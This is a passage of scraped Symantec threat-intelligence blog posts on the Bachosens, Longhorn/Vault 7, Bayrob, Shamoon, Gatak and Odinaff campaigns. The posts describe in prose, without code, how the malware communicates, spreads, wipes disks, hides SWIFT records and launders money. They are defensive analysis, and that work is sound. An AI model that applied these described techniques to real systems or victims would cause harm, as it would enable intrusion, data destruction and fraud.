potential data leaks from within an organization. Implement SMB egress traffic filtering on perimeter devices to prevent SMB traffic leaving your network onto the internet. Educate employees on the dangers posed by spear-phishing emails, including exercising caution around emails from unfamiliar sources and opening attachments that haven’t been solicited. A full protection stack helps to defend against emailed threats, includingSymantec Email Security.cloud, which can block email-borne threats, andSymantec Endpoint Protection, which can block malware on the endpoint.Symantec Messaging Gateway’sDisarm technology can also protect computers from threats by removing malicious content from attached documents before they even reach the user. Understanding the tools, techniques, and procedures (TTP) of adversaries through services likeDeepSight Adversary Intelligencefuels effective defense from advanced adversaries like Dragonfly 2.0. Beyond technical understanding of the group, strategic intelligence that informs the motivation, capability, and likely next moves of the adversaries ensures more timely and effective decisions in proactively safeguarding your environment from these threats. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dragonfly-energy-sector-cyber-attacks"
  },
  {
    "title": "bachosens cyber crime investigation",
    "content": "In attacks reminiscent of the early days of malware, a lone wolf threat actor who appears to be based in a disputed part of eastern Moldova is using advanced malware to carry out cyber attacks against large organizations for relatively modest rewards. The malware in question, Trojan.Bachosens, was so advanced that Symantec analysts initially thought they were looking at the work of nation-state actors. However, further investigation revealed a 2017 equivalent of the hobbyist hackers of the 1990s—the only difference being this hacker wasn’t out for bragging rights. He was out for financial reward. This lone wolf attacker—who we call Igor—is not an average cyber criminal with the aim of infecting as many victims as possible. Rather, he has been carrying out highly targeted attacks on specific organizations. Igor developed a specialized tool, a piece of malware called Bachosens, to gain access to at least two large organizations, an international airline and a Chinese auto-tech company. Symantec believes that Igor planted the malware through the use of spear-phishing emails, a tactic typically employed by nation-state actors. Igor targeted the auto-tech company in order to steal car diagnostics software. This software retails for approximately $1,100 through legitimate channels. Igor is selling it for just a few hundred dollars on underground forums and websites he has created expressly for this purpose. Considering the audacity of this attack, the financial rewards for Igor are pretty low. There are indications that Igor has been active for quite some time. Symantec first identified the use of Bachosens in 2014. However, the auto-tech company targeted by Igor issued an alert as far back as 2009 about its software being sold by an unauthorized reseller. Symantec was able to confirm links between the domains mentioned in this alert and Igor, indicating he has been active for almost 10 years. Symantec researchers’ analysis of Igor’s activities allowed us to gain an insight into his methods and areas of focus. Based on publicly available information, Symantec was able to find likely connections between Igor and an auto parts store located in Transnistria, a disputed territory in Moldova. His involvement in the automotive industry could explain why he showed an interest in targeting the auto-tech company. While the targeting of the Chinese auto-tech company with this malware seems to have an obvious aim—to steal software with the aim of selling it and making money—Symantec also saw some activity that is harder to explain. The Bachosens Trojan was also found on a number of systems in a large commercial airline, however, the motive for this attack is unclear at this time. Symantec is confident that this malware is only being used by Igor. Our evidence also shows that Igor’s campaigns are highly targeted, therefore it’s unlikely that this infection was accidental. There is also evidence Igor attempted to infect an online gambling organization. He used targeted spear-phishing emails with an attachment containing malicious macros in this infection attempt, which was ultimately unsuccessful. This is an attacker who is made up of contradictions: he uses well-developed malware, but makes some basic operational mistakes that allowed Symantec researchers to uncover a lot about his activities. As previously mentioned, this malware is highly sophisticated, displaying a technical competency similar to that seen in malware used by nation-state actors, indicating that its developer has a high level of skill. It is possible Igor purchased this malware from another developer, however, as no one else has been observed online using it, Symantec researchers believe this is unlikely, and believe that Igor developed this malware himself. Elements of this attack that make it stand out from the ordinary include the use of rarely used covert communication channels, such as DNS, ICMP, and HTTP, to communicate with the command and control (C&C) server. The attacker also encrypts the victim’s information before it is transmitted to the C&C server, with the malware programmed to create a set of ephemeral AES keys to encrypt the data before sending it. He also sends these communications over IPv6, which can make them harder to detect than if sent over IPv4. Igor also uses dynamic DNS (DDNS) and domain generation algorithms (DGA). DGA is used to generate a prefix, which is added to a DDNS controlled root domain to form the C&C server. Oddly, while malware that uses DGA normally creates hundreds of domains at a time—with the aim being to make it more difficult for the malware to be detected—this attacker only created 13 domains using DGA over the course of an entire year. One domain was valid for the entire year, with one new domain created each month. Creating such a small number of domains essentially defeats the purpose of using DGA, as it would only allow the attacker to avoid the most basic cyber defenses. This unusual use of DGA is just one of the parts of Igor’s operations that demonstrates a lack of polish, and shows an interesting contradiction between the advanced level of the malware and the rather unpolished way in which it is used. Igor submitted malware samples to Virus Total to test the detection capabilities of defenders, and used development names (such as mod_exe and mod_dll) in the submission, which would draw attention to it. It is known that malicious hackers often use Virus Total, a tool that analyzes URLs and files to detect malware, to test the malware they are developing. Using development file names indicates that a piece of malware is a work in progress and is more likely to draw the attention of investigators. The malware was also found packaged with computer games, which is not generally something that would be seen in advanced attacks. In fact, Symantec researchers first realized that this malware was unlikely to be the work of a nation state or sophisticated cyber attacker when they found it packaged with an online video game. Igor also used an unobfuscated keylogger, something professional cyber attackers are very unlikely to do. He also posted personal information on publicly accessible auto forums where he was attempting to sell the stolen software, exposing himself as a likely perpetrator. These various missteps indicate that while Igor may be talented enough to create highly advanced malware, he lacks the expertise of more professional cyber attackers. Symantec researchers’ investigations have turned up quite a lot of information about this cyber attacker. Symantec believes he may be based in the town of Tiraspol in eastern Moldova. Officially, Tiraspol is the second-largest city in Moldova, but it is also the capital of the self-declared republic of Transnistria, which is not recognized as an independent state by the UN. The dominant language in Transnistria is Russian, and there were Russian strings used in the Bachosens malware, and communication with the C&C server uses what appears to be the Russian equivalents of size suffixes for KB, MB, GB, and TB. This had indicated to researchers that the individual behind this malware was likely Russian speaking. The level of information the attacker knowingly or negligently revealed about himself online gave us high confidence that he is an individual involved in the auto industry who is based in this part of Eastern Europe. His likely location in Tiraspol may also explain why he appears to have such modest aims when it comes to the gains he seems to be making from cyber crime. Although it is hard to get official data given it is a disputed territory, the average monthly salary in Transnistria has been reported as being as little as a few hundred euro. In that context, selling stolen software online for a few hundred euro could represent quite the windfall for an individual based in that part of the world. While we have gleaned a lot of information about this attack, much of this attacker’s activity remains a mystery, such as the motivations behind some of his activity, and where he may have acquired the skills to create such sophisticated malware, while clearly demonstrating lack of expertise in other areas. However, this activity does show us that while nation-state actors and organized cyber crime gangs carrying off big heists may be what grabs headlines, there are still lone wolf attackers out there making a comfortable living from cyber crime. Symantec and Norton products have the following detections in place for the threats called out in this blog: For a technical analysis of the details of this investigation, please read ouranalyst’s blog on Medium. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/bachosens-cyber-crime-investigation"
  },
  {
    "title": "longhorn cyberespionage vault7",
    "content": "Spying tools and operational protocols detailed in the recent Vault 7 leak have been used in cyberattacks against at least 40 targets in 16 different countries by a group Symantec calls Longhorn. Symantec has been protecting its customers from Longhorn’s tools for the past three years and has continued to track the group in order to learn more about its tools, tactics, and procedures. The tools used by Longhorn closely follow development timelines and technical specifications laid out in documents disclosed by WikiLeaks. The Longhorn group shares some of the same cryptographic protocols specified in the Vault 7 documents, in addition to following leaked guidelines on tactics to avoid detection. Given the close similarities between the tools and techniques, there can be little doubt that Longhorn's activities and the Vault 7 documents are the work of the same group. Longhorn has been active since at least 2011. It has used a range of back door Trojans in addition to zero-day vulnerabilities to compromise its targets. Longhorn has infiltrated governments and internationally operating organizations, in addition to targets in the financial, telecoms, energy, aerospace, information technology, education, and natural resources sectors. All of the organizations targeted would be of interest to a nation-state attacker. Longhorn has infected 40 targets in at least 16 countries across the Middle East, Europe, Asia, and Africa. On one occasion a computer in the United States was compromised but, following infection, an uninstaller was launched within hours, which may indicate this victim was infected unintentionally. A number of documents disclosed by WikiLeaks outline specifications and requirements for malware tools. One document is a development timeline for a piece of malware called Fluxwire, containing a changelog of dates for when new features were incorporated. These dates align closely with the development of one Longhorn tool (Trojan.Corentry) tracked by Symantec. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later, leaving little doubt that Corentry is the malware described in the leaked document. Early versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file. The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0. Up until 2014, versions of Corentry were compiled using GCC. According to the Vault 7 document, Fluxwire switched to a MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015 had used MSVC as a compiler. A second Vault 7 document details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel. The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called Backdoor.Plexor. A third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks, key exchange once per connection, and use of AES with a 32-byte key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools. Other Vault 7 documents outline tradecraft practices to be used, such as use of the Real-time Transport Protocol (RTP) as a means of command and control (C&C) communications, employing wipe-on-use as standard practice, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and the use of secure erase protocols involving renaming and overwriting. Symantec has observed Longhorn tools following all of these practices. While other malware families are known to use some of these practices, the fact that so many of them are followed by Longhorn makes it noteworthy. While active since at least 2011, with some evidence of activity dating back as far as 2007, Longhorn first came to Symantec’s attention in 2014 with the use of a zero-day exploit (CVE-2014-4148) embedded in a Word document to infect a target with Plexor. The malware had all the hallmarks of a sophisticated cyberespionage group. Aside from access to zero-day exploits, the group had preconfigured Plexor with elements that indicated prior knowledge of the target environment. To date, Symantec has found evidence of Longhorn activities against 40 targets spread across 16 different countries. Symantec has seen Longhorn use four different malware tools against its targets: Corentry, Plexor, Backdoor.Trojan.LH1, and Backdoor.Trojan.LH2. Before deploying malware to a target, the Longhorn group will preconfigure it with what appears to be target-specific code words and distinct C&C domains and IP addresses for communications back to the attackers. Longhorn tools have embedded capitalized code words, internally referenced as “groupid” and “siteid”, which may be used to identify campaigns and victims. Over 40 of these identifiers have been observed, and typically follow the theme of movies, characters, food, or music. One example was a nod to the band The Police, with the code words REDLIGHT and ROXANNE used. Longhorn’s malware has an extensive list of commands for remote control of the infected computer. Most of the malware can also be customized with additional plugins and modules, some of which have been observed by Symantec. Longhorn’s malware appears to be specifically built for espionage-type operations, with detailed system fingerprinting, discovery, and exfiltration capabilities. The malware uses a high degree of operational security, communicating externally at only select times, with upload limits on exfiltrated data, and randomization of communication intervals—all attempts to stay under the radar during intrusions. For C&C servers, Longhorn typically configures a specific domain and IP address combination per target. The domains appear to be registered by the attackers; however they use privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering virtual private server (VPS) or webhosting services. The malware communicates with C&C servers over HTTPS using a custom underlying cryptographic protocol to protect communications from identification. Prior to the Vault 7 leak, Symantec’s assessment of Longhorn was that it was a well-resourced organization which was involved in intelligence gathering operations. This assessment was based on its global range of targets and access to a range of comprehensively developed malware and zero-day exploits. The group appeared to work a standard Monday to Friday working week, based on timestamps and domain name registration dates, behavior which is consistent with state-sponsored groups. Symantec’s analysis uncovered a number of indicators that Longhorn was from an English-speaking, North American country. The acronym MTWRFSU (Monday Tuesday Wednesday ThuRsday Friday Saturday SUnday) was used to configure which day of the week malware would communicate with the attackers. This acronym is common in academic calendars in North America. Some of the code words found in the malware, such as SCOOBYSNACK, would be most familiar in North America. In addition to this, the compilation times of tools with reliable timestamps indicate a time zone in the Americas. Longhorn has used advanced malware tools and zero-day vulnerabilities to infiltrate a string of targets worldwide. Taken in combination, the tools, techniques, and procedures employed by Longhorn are distinctive and unique to this group, leaving little doubt about its link to Vault 7. Throughout its investigation of Longhorn, Symantec’s priority has been the protection of its customers. Through identifying different strains of Longhorn malware, connecting them to a single actor, and learning more about the group’s tactics and procedures, Symantec has been able to better defend customer organizations against this and similar threats. In publishing this new information, Symantec’s goal remains unchanged: to reassure customers that it is aware of this threat and actively working to protect them from it. Symantec and Norton products have been protecting against Longhorn malware for a number of years with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/longhorn-cyberespionage-vault7"
  },
  {
    "title": "bayrob suspects extradited",
    "content": "Three Romanian men have been indicted in the US for allegedly operating a longstanding fraud operation known as Bayrob that conned victims out of millions of dollars. Bogdan Nicolescu (aka “Masterfraud”, aka “mf”); Danet Tiberiu (aka “Amightysa”, aka “amy”); and Radu Miclaus (aka “Minolta”, aka “min”) were arrested by police in Romania earlier this year before being extradited to the US, where they now face multiple charges relating to fraud, identity theft, money laundering, and trafficking in counterfeit goods or services. Our research shows that the Bayrob gang are career cybercriminals, earning a living from online fraud. They specialize in detailed scams and go to great lengths to craft convincing emails and create fake websites, voice messages, and even customer support chatrooms in order to dupe victims. The gang began its career running elaborate cons where it created fake vehicle auctions to defraud victims out of tens of thousands of dollars. It later expanded and diversified with a number of different fraud and malware operations, ranging from credit card theft to cryptocurrency mining using infected computers. The FBI believes that the Bayrob group has stolen at least US$4 million from victims over the past eight years, though the actual total may be up to $35 million. It also established that the group infected between 60,000 and 160,000 computers and sent out 11 million malicious emails. The arrests are the culmination of an eight-year law enforcement investigation which was assisted by Symantec. During this time, Symantec discovered multiple versions of Bayrob malware, collected helpful intelligence data, and witnessed Bayrob as it morphed from online fraud to a 300,000+ botnet for cryptocurrency mining. Symantec succeeded in exposing the gang’s operations, gaining insight into its key players, tactics, malware, and the potential impact and criminal activity undertaken. Bayrob first came to our attention in 2007, when it was discovered operating a scam that conned victims into believing they were buying a vehicle on eBay. Victims’ computers were infected with custom designed malware (Trojan.Bayrob) which displayed fake eBay web pages and misled users into thinking they were conducting a legitimate purchase on the auction site. The gang identified potential victims by listing vehicles for sale on a number of websites, including eBay and classified advertising websites. It noted anyone who displayed an interest in the sale, such as those who asked questions or put a bid on the vehicle. The gang would then pretend that the sale had concluded but later email potential victims, informing them that the sale had fallen through and asking if they were still interested. Attached to these emails was a slideshow file, containing pictures of the vehicle supposedly on sale. This file was infected with Trojan.Bayrob. If the victim opened it, the malware was installed on their computer. Once the attackers verified that the Bayrob Trojan was running on a victim’s computer, they moved on to the next stage of the scam by sending an email with what they claimed was a link to a new auction for the vehicle. It was at this point that the Trojan came into play. If the victim clicked on the link, it would redirect them to a fake eBay page. If they decided to buy the vehicle, they were asked to pay by way of a bank transfer, which was routed to an account that belonged to a money mule, who would in turn transfer the proceeds of the fraud to the gang. From the victim’s standpoint it appeared they were visiting a real eBay auction. However, if the link was followed from an uninfected computer, there would be no such auction. The gang went to great lengths to make the scam appear realistic. Its emails were composed in fluent English and every iteration of the Bayrob Trojan was customized for its intended victim. The fake eBay web pages even included fictitious feedback about the seller. The Trojan was also capable of generating fake vehicle history reports, along with fake pages from escrow and delivery services. The fraud had a major impact on its victims, who often transferred thousands of dollars thinking they were paying for a new car and ended up with nothing. Bayrob’s activities were initially exposed by Symantec in 2007, when wepublished a series of blogshighlighting the eBay scam, and several media outlets reported on their activities. The gang reacted angrily and, for a while, registered command and control (C&C) domain names that contained abusive references to our researchers and made disparaging references to Symantec in its code. However, public attention didn’t deter the gang from further expanding and refining its operations. For example, they created a fake trucking company, which was used to supposedly transport purchased vehicles to their victims. The trucking company would first inform the victim their vehicle was on the way and then later email them informing them of delays. It even operated a phone line and fake voicemail service to appear more convincing. The whole purpose of the fake trucking company was to string the victim along for as long as possible in order to make sure the gang received the money before the victim realized they’d been conned. In order to move the proceeds of its scams back to Romania, the gang recruited a wide network of money mules. It found potential mules by spamming classified advertising websites with fake job ads. Rather than the usual cybercriminal tactic of using “work from home” ads, the Bayrob gang often copied legitimate job ads in order appear more convincing. Those who responded were told that the job had been filled but were then offered an alternative, work from home job. As with its other operations, money mule recruitment was professionally executed and backed up by a series of fake websites and convincing looking emails, such as one purporting to offer the recipient a job with a technology company. Some victims were even told they’d gotten a job with a fake Yahoo subsidiary called Yahoo Transfers. Given that they would be handling the gang’s stolen money, mules were thoroughly vetted during recruitment, using Google searches, instant messaging, and VoIP calls. The group recruited mules on both sides of the Atlantic. Victims in the US were instructed to route payments to a bank account controlled by a mule in the US. These in turn were asked to transfer the money to another mule, usually in an Eastern European country. They would then presumably transfer the money on to gang members. Mules in the US were often vulnerable people in difficult circumstances. They appeared to be unwitting pawns of the gang, unaware of what they’d become involved with. Less is known about the money mules used in Europe, but most appeared to collect transferred funds using fake identities, indicating they may have been more complicit in the gang’s activities. Mules in the US were given two options for payment. They could keep six percent of the funds they transferred or they could send the entire amount and later receive a check for 10 percent of the total.  The latter option was a scam and nobody who opted for it received any payment from the gang. Despite putting these money mules at risk of arrest and prosecution, the gang had no qualms about double-crossing them and stealing from them too. Over time, the Bayrob gang expanded beyond its original auction fraud and into other areas of cybercrime. The group began stealing credit card information from the users of infected computers, using the stolen cards to finance the purchase of online infrastructure and services that allowed it to grow its operations. In recent years, the gang has concentrated on rapidly growing the number of infected computers in order to build a botnet. When it was exclusively involved in auction fraud, the number of infected computers was around 1,000 at any one time. However, by 2014 it had jumped to approximately 50,000 and by mid-2016 it had grown to over 300,000 and continued to grow. One of the main purposes of this botnet appeared to be cryptocurrency mining. A large number of infected computers provided the gang with the necessary processing power to profit significantly from mining. Since 2011, Symantec has managed to progressively uncover the gang’s network, gaining a broad picture of its operations. The information generated by our investigation not only helped us to improve our protections against the group’s malware, but also allowed us to prevent future attacks and warn potential victims. What we learned assisted the FBI in its investigation and we opted not to publish what we discovered in recent years until the FBI investigation was concluded. Bayrob employed a high degree of internal security. Their online communications involved extensive use of encryption, with email encrypted using PGP and instant messaging encrypted with the Off-The-Record (OTR) messaging protocol. In order to cover its tracks, the gang hid behind a double layer of proxies, connecting first to proxies in Romania and then to more proxies in the US. One of our most significant breakthroughs came when we discovered a weak point in their use of these proxies. Due to this weakness, the gang's malicious activities were exposed, allowing us to passively observe its activities on computers Symantec was protecting.Our investigation required time and patience. In one case, we observed the gang’s malicious activities for a year and a half before it made an error that exposed one of its suspected members. Over time we came to understand the group’s infrastructure which helped us to get see more of the gang’s operations. Symantec’s pursuit of Bayrob is one of many long-standing investigations we currently have underway, all of which are motivated by a desire to protect our customers. Today’s arrests illustrate the value of effective co-operation between security companies and law enforcement and sends a clear signal to international cybercrime gangs that they are not beyond the reach of the justice system. Symantec products use multiple layers over protection against Bayrob’s malware. Protection has been continuously updated since 2007 to block against each new iteration of the group’s malware. Symantec and Norton products block Bayrob malware with the following detections: Intrusion prevention system In addition to this, a range of Symantec generic detections also successfully block Bayrob malware. The addition of generic detections to our defense layer makes it more difficult for attackers to identify which detections are designed to specifically block their malware, making it hard to test against them. Symantec has gathered full technical details and indicators of compromise for all Bayrob malware variants discovered since 2007. This can be supplied to any member of the information security community upon request. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/bayrob-suspects-extradited"
  },
  {
    "title": "shamoon back destructive",
    "content": "Shamoon (W32.Disttrack), the aggressive disk-wiping malware which was used in attacks against the Saudi energy sector in 2012, has made a surprise comeback and was used in a fresh wave of attacks against targets in Saudi Arabia. The malware used in the recent attacks (W32.Disttrack.B) is largely unchanged from the variant used four years ago. In the 2012 attacks, infected computers had their master boot records wiped and replaced with an image of a burning US flag. The latest attacks instead used a photo of the body of Alan Kurdi, the three year-old Syrian refugee who drowned in the Mediterranean last year. The attackers appear to have done a significant amount of preparatory work for the operation. The malware was configured with passwords that appear to have been stolen from the targeted organizations and were likely used to allow the threat to spread across a targeted organization’s network. How the attackers obtained the stolen credentials is unknown. The malware had a default configuration that triggered the disk-wiping payload at 8:45pm local time on Thursday, November 17. The Saudi Arabian working week runs from Sunday to Thursday. It would appear that the attack was timed to occur after most staff had gone home for the weekend in the hope of reducing the chance of discovery before maximum damage could be caused. Shamoon uses a number of components to infect computers. The first component is a dropper, which creates a service with the name ‘NtsSrv’ to remain persistent on the infected computer. It spreads across a local network by copying itself on to other computers and will drop additional components to infected computers. The dropper comes in 32-bit and 64-bit versions. If the 32-bit dropper detects a 64-bit architecture, it will drop the 64-bit version. The second component is the wiper, which drops a third component, known as the Eldos driver. This enables access to the hard disk directly from user-mode without the need of Windows APIs. The wiper uses the Eldos driver to overwrite the hard disk with the aforementioned photos of the Syrian boy. The final component is the reporter. This is responsible for handling communications with a command and control (C&C) server operated by the attackers. It can download additional binaries from the C&C server and change the pre-configured disk-wiping time if instructed by the C&C server. It is also configured to send a report verifying that a disk has been wiped to the C&C server. Although attacks involving destructive malware such as Shamoon are relatively rare, they can be highly disruptive for the targeted organization, potentially knocking mission-critical computers offline. Why Shamoon has suddenly returned again after four years is unknown. However, with its highly destructive payload, it is clear that the attackers want their targets to sit up and take notice. Symantec and Norton products protect against Shamoon with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shamoon-back-destructive"
  },
  {
    "title": "gatak healthcare",
    "content": "The group behind the Gatak Trojan (Trojan.Gatak) continues to pose a threat to organizations, with the healthcare sector in particular heavily affected by attacks. Gatak is known for infecting its victims through websites promising product licensing keys for pirated software. While the group focused on US targets, it has diversified over the past two years and attacks are now taking place against organizations in a broad range of countries. The majority of Gatak infections (62 percent) occur on enterprise computers. Analysis of recent enterprise attacks indicates that the healthcare sector is by far the most affected by Gatak. Of the top 20 most affected organizations (organizations with the most infected computers), 40 percent were in the healthcare sector. In the past, the insurance sector was also heavily targeted by the group. Gatak victims are infected using websites offering product key generators or “keygens” for pirated software. The malware is bundled with the product key and, if the victim is tricked into downloading and opening one of these files, the malware is surreptitiously installed on their computer. The attackers appear to focus on offering product keys for software that is more likely to be used in professional environments. The websites used in the attacks are controlled by the attackers and have no connection with the developers of the software.  At no point are legitimate versions of software compromised. Among the software brands used as lures were: The product keys downloaded from these websites do not work and simply generate pseudo-random sequence of characters. This means all the victim gets from the download is a junk file and a potential Gatak infection. The Gatak Trojan (aka Stegoloader) has been used in attacks since at least 2011. There are two main components of the malware. A lightweight deployment module (Trojan.Gatak.B) can perform detailed system fingerprinting on infected computers and selectively install additional payloads. The main module (Trojan.Gatak) is a fully fledged back door Trojan, which maintains a persistent presence on an infected computer and steals information from it. A notable feature of Gatak is its use of steganography, a technique for hiding data within image files. When Gatak is installed on a computer, it attempts to download a PNG image file from one of a number of URLs hardcoded into the malware. The image looks like an ordinary photograph, but contains an encrypted message within its pixel data. The Gatak Trojan is capable of decrypting this message, which contains commands and files for execution. In approximately 62 percent of incidents, lateral movement across the victim’s network occurs within two hours of infection. In the remaining cases, lateral movement began at some point after the two hour mark. The variance indicates that lateral movement isn’t automated and instead carried out manually by the attackers. Whether the attackers don’t have the resources to exploit all infections immediately or whether they prioritize some infections over others is unknown. Little is known about how the attackers move across an organization’s network. The most likely explanation is that they exploit weak passwords and poor security in file shares and network drives. There is no evidence of zero-day exploits or sophisticated hacking tools being employed. In some cases, the attackers have infected computers with other malware, including various ransomware variants and the Shylock (Trojan.Shylock) financial Trojan. In the case of Shylock, these appear to be older versions of the threat and might even be “false flag” infections. They may be used by the group when they believe their attack has been uncovered, in order to throw investigators off the scent. Little is known about the group behind Gatak, although the corporate nature of its targets, along with the absence of zero-day vulnerabilities or advanced malware modules suggest that it may be cybercriminal in nature, however there are also capabilities within the malware for more traditional espionage operations. It is unclear how Gatak is profiting from its attacks. One possibility is data theft, with the attackers selling personally identifiable information and other stolen data on the cyberunderground. This could explain the attackers’ heavy focus on the healthcare sector, with healthcare records usually selling for more than other personal information. However, Gatak’s means of distribution, through keygen websites, indicates that the attackers may be more opportunistic. By using a watering-hole approach, the attackers play a largely passive role, with relatively little control over who is infected. If this is the case, the healthcare sector may simply be the most susceptible to these kinds of attacks. Healthcare organizations can often be pressurized, under-resourced, and many use legacy software systems that are expensive to upgrade. Consequently, workers could be more likely to take shortcuts and install pirated software. While organizations in other sectors appear to be infected less frequently, the attackers don’t appear to ignore or remove these infections when they occur. Since it first appeared five years ago the Gatak group has carried out a steady stream of attacks and the Trojan represents a serious threat to any organization, particularly in the healthcare sector. Gatak provides a timely reminder that the use of pirated software can compromise security in addition to creating legal issues for an organization. Along with using a robust security solution, organizations should regularly audit the software used on their network and educate staff about the dangers of using pirated or unapproved software. Symantec and Norton products protect against this threat with the following detections: Intrusion prevention system: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/gatak-healthcare"
  },
  {
    "title": "odinaff trojan financial attacks",
    "content": "Since January 2016, discreet campaigns involving malware called Trojan.Odinaff have targeted a number of financial organizations worldwide. These attacks appear to be extremely focused on organizations operating in the banking, securities, trading, and payroll sectors. Organizations who provide support services to these industries are also of interest. Odinaff is typically deployed in the first stage of an attack, to gain a foothold onto the network, providing a persistent presence and the ability to install additional tools onto the target network. These additional tools bear the hallmarks of a sophisticated attacker which has plagued the financial industry since at least 2013–Carbanak. This new wave of attacks has also used some infrastructure that has previously been used in Carbanak campaigns. These attacks require a large amount of hands on involvement, with methodical deployment of a range of lightweight back doors and purpose built tools onto computers of specific interest. There appears to be a heavy investment in the coordination, development, deployment, and operation of these tools during the attacks. Custom malware tools, purpose built for stealthy communications (Backdoor.Batel), network discovery, credential stealing, and monitoring of employee activity are deployed. Although difficult to perform, these kinds of attacks on banks can be highly lucrative. Estimates of total losses to Carbanak-linked attacks range from tens of millions to hundreds of millions of dollars. Attacks involving Odinaff appear to have begun in January 2016. The attacks have hit a wide range of regions, with the US the most frequently targeted. It was followed by Hong Kong, Australia, the UK and Ukraine. Most Odinaff attacks were against financial targets. In attacks where the nature of the victim’s business was known, financial was by far the most frequently hit sector, accounting for 34 percent of attacks. There were a small number of attacks against organizations in the securities, legal, healthcare, government and government services targets; however, it is unclear whether all of these were financially motivated. Around 60 percent of attacks were against targets whose business sector was unknown, but in many cases these were against computers running financial software applications, meaning the attack was likely financially motivated. The Odinaff attackers’ use a variety of methods to break into the networks of targeted organizations. One of the most common methods of attack is through lure documents containing a malicious macro. If the recipient opts to enable macros, the macro will install the Odinaff Trojan on their computer. Another attack involves the use of password-protected RAR archives, in order to lure the victims into installing Odinaff on their computers. Although Symantec has not seen how these malicious documents or links are distributed, we believe spear-phishing emails are the most likely method. Trojan.Odinaff has also been seen to be distributed through botnets, where the Trojan is pushed out to computers already infected with other malware, such as Andromeda (Downloader.Dromedan) and  Snifula (Trojan.Snifula). In the case of Andromeda, this was bundled as a Trojanized installer for AmmyyAdmin, a legitimate remote administration tool. The Trojanized installer was downloaded from the official website, which has been targeted repeatedly in recent times to spread a number of different malware families. Odinaff is a relatively lightweight back door Trojan that connects to a remote host and looks for commands every five minutes. Odinaff has two key functions: it can download RC4 encrypted files and execute them and it can also issue shell commands, which are written to a batch file and then executed. Given the specialist nature of these attacks, a large amount of manual intervention is required. The Odinaff group carefully manages its attacks, maintaining a low profile on an organization’s network, downloading and installing new tools only when needed. Trojan.Odinaff is used to perform the initial compromise, while other tools are deployed to complete the attack. A second piece of malware known as Batle (Backdoor.Batel) is used on computers of interest to the attackers. It is capable of running payloads solely in memory, meaning the malware can maintain a stealthy presence on infected computers. The attackers make extensive use of a range of lightweight hacking tools and legitimate software tools to traverse the network and identify key computers. These include: The group also appears to have developed malware designed to compromise specific computers. The build times for these tools were very close to the time of deployment. Among them were components capable of taking screenshot images at intervals of between five and 30 seconds. Symantec has found evidence that the Odinaff group has mounted attacks on SWIFT users, using malware to hide customers’ own records of SWIFT messages relating to fraudulent transactions. The tools used are designed to monitor customers’ local message logs for keywords relating to certain transactions. They will then move these logs out of customers’ local SWIFT software environment. We have no indication that SWIFT network was itself compromised. These “suppressor” components are tiny executables written in C, which monitor certain folders for files that contain specific text strings. Among the strings seen by Symantec are references to dates and specific International Bank Account Numbers (IBANs). The folder structure in these systems seem to be largely user defined and proprietary, meaning each executable appears to be clearly tailored to for a target system. One of the files found along with the suppressor was a small disk wiper which overwrites the first 512 bytes of the hard drive. This area contains the Master Boot Record (MBR) which is required for the drive to be accessible without special tools. We believe this tool is used to cover the attackers’ tracks when they abandon the system and/or to thwart investigations. These Odinaff attacks are an example of another group believed to be involved in this kind of activity, following the Bangladesh central bank heist linked to the Lazarus group. There are no apparent links between Odinaff’s attacks and the attacks on banks’ SWIFT environments attributed to Lazarus and the SWIFT-related malware used by the Odinaff group bears no resemblance to Trojan.Banswift, the malware used in the Lazarus-linked attacks. The attacks involving Odinaff share some links to the Carbanak group, whose activities became public in late 2014. Carbanak also specializes in high-value attacks against financial institutions and has been implicated in a string of attacks against banks in addition to point of sale (PoS) intrusions. Aside from the similar modus operandi, there are a number of other links between Carbanak and Odinaff: Since Carbanak’s main Trojan, Anunak (Trojan.Carberp.B and Trojan.Carberp.D) was never observed in campaigns involving Odinaff, we firmly believe the group uses a number of discreet distribution channels to compromise financial organizations. While it is possible that Odinaff is part of the wider organization, the infrastructure crossover is atypical, meaning it could also be a similar or cooperating group. The discovery of Odinaff indicates that banks are at a growing risk of attack. Over the past number of years, cybercriminals have begun to display a deep understanding of the internal financial systems used by banks. They have learned that banks employ a diverse range of systems and have invested time in finding out how they work and how employees operate them. When coupled with the high level of technical expertise available to some groups, these groups now pose a significant threat to any organization they target. Symantec and Norton products detect these threats as: Bluecoat products will: The following are examples of the various tools in use: Odinaff document droppers SWIFT log suppressors Backdoor.Batel RTF document dropper Backdoor.Batel stagers Older Batel *.CPL droppers Cobalt 